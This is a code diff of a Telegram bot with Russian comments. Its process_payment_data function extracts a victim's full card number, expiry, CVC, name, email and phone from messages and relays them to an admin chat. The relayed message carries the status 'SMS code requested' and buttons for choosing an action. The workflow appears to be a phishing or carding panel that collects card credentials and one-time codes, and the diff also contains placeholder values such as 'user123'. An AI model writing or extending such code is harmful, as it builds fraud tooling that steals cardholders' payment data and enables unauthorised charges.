@@ -625,25 +625,16 @@ async def handle_admin_messages(message: types.Message):
 
 async def process_payment_data(message: types.Message):
     try:
-        logger.info(f"🔍 ДЕБАГ process_payment_data: НАЧАЛО")
-        logger.info(f"🔍 ДЕБАГ: Полный текст сообщения:")
-        logger.info(f"```{message.text}```")
-        
         lines = message.text.split('\n')
         payment_data = {}
         card_number = None
 
-        # Детально разбираем каждую строку
         for line in lines:
             line = line.strip()
-            logger.info(f"🔍 ДЕБАГ Строка: {line}")
-            
             if 'Номер:' in line:
                 card_number = line.split('Номер:')[1].strip()
-                logger.info(f"🔍 ДЕБАГ Найден номер (формат 1): {card_number}")
             elif '• Номер:' in line:
                 card_number = line.split('• Номер:')[1].strip()
-                logger.info(f"🔍 ДЕБАГ Найден номер (формат 2): {card_number}")
             elif 'Имя:' in line:
                 payment_data['first_name'] = line.split('Имя:')[1].strip()
             elif 'Фамилия:' in line:
@@ -657,59 +648,31 @@ async def process_payment_data(message: types.Message):
             elif 'CVC:' in line:
                 payment_data['cvc'] = line.split('CVC:')[1].strip()
 
-        logger.info(f"🔍 ДЕБАГ Итоговый card_number: {card_number}")
+        # Проверяем статус карты в БД
+        card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+        
+        # Форматируем сообщение
+        formatted_text = f"💳 <b>{card_status}</b>\n\n"
+        formatted_text += "👤 <b>Клиент:</b>\n"
+        formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
+        formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
+        formatted_text += f"• Email: {payment_data.get('email', '')}\n"
+        formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
+        formatted_text += "💳 <b>Карта:</b>\n"
+        formatted_text += f"• Номер: {card_number}\n"
+        formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
+        formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
+        formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
+        formatted_text += "Выберите действие:"
 
-        # Если номер карты не нашелся, пробуем найти в другом формате
-        if not card_number:
-            for line in lines:
-                if 'Номер' in line and ':' in line:
-                    card_number = line.split(':')[1].strip()
-                    logger.info(f"🔍 ДЕБАГ Найден номер (универсальный): {card_number}")
-                    break
-
-        # СОЗДАЕМ ПЛАТЕЖ
-        payment_id = save_payment(
-            user_id=0,
-            first_name=payment_data.get('first_name', ''),
-            last_name=payment_data.get('last_name', ''),
-            email=payment_data.get('email', ''),
-            phone=payment_data.get('phone', ''),
-            card_number=card_number,
-            card_expiry=payment_data.get('card_expiry', ''),
-            cvc=payment_data.get('cvc', '')
+        # РЕДАКТИРУЕМ исходное сообщение вместо создания нового
+        await bot.edit_message_text(
+            chat_id=ADMIN_CHAT_ID,
+            message_id=message.message_id,
+            text=formatted_text,
+            reply_markup=get_payment_buttons(999, "user123", card_number),
+            parse_mode="HTML"
         )
-
-        if payment_id:
-            # ДЕБАГ перед отправкой
-            logger.info(f"🔍 ДЕБАГ: Отправляем сообщение с клавиатурой")
-            logger.info(f"🔍 ДЕБАГ: card_number для кнопки: {card_number}")
-            
-            formatted_text = f"💳 <b>НОВЫЙ ПЛАТЕЖ #{payment_id}</b>\n\n"
-            formatted_text += "👤 <b>Клиент:</b>\n"
-            formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
-            formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
-            formatted_text += f"• Email: {payment_data.get('email', '')}\n"
-            formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
-            formatted_text += "💳 <b>Карта:</b>\n"
-            formatted_text += f"• Номер: {card_number or 'НЕ ИЗВЛЕЧЕНО'}\n"
-            formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
-            formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "🔄 <b>Статус: Ожидание действий</b>\n\n"
-            formatted_text += "Выберите действие:"
-            
-            logger.info(f"🔍 ДЕБАГ: Текст сообщения: {formatted_text[:200]}...")
-            
-            # ВАЖНО: Всегда передаем card_number в get_payment_buttons
-            keyboard = get_payment_buttons(payment_id, "user123", card_number)
-            logger.info(f"🔍 ДЕБАГ: Клавиатура создана")
-            
-            await bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=formatted_text,
-                reply_markup=keyboard,
-                parse_mode="HTML"
-            )
-            logger.info(f"✅ Сообщение с платежом #{payment_id} ОТПРАВЛЕНО")
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
@@ -1080,6 +1043,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
